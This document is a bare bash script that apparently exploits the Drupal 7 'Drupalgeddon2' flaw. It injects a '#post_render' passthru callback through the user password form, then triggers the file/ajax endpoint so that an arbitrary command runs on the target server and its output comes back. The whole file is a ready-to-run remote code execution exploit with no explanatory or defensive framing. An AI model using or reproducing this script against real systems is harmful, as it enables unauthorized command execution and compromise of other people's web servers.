#!/bin/bash

ip=$1

cmd="$(echo $2 | sed 's/ /%20/g')"

url="http://$ip/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=$cmd"

form="$(curl -s -X POST $url -d 'form_id=user_pass&_triggering_element_name=name' | grep form_build_id | cut -d '"' -f 6)"

form_url="http://$ip/?q=file/ajax/name/%23value/$form"

output="$(curl -s -X POST $form_url -d "form_build_id=$form" | cut -d '[' -f 1)"

echo $output

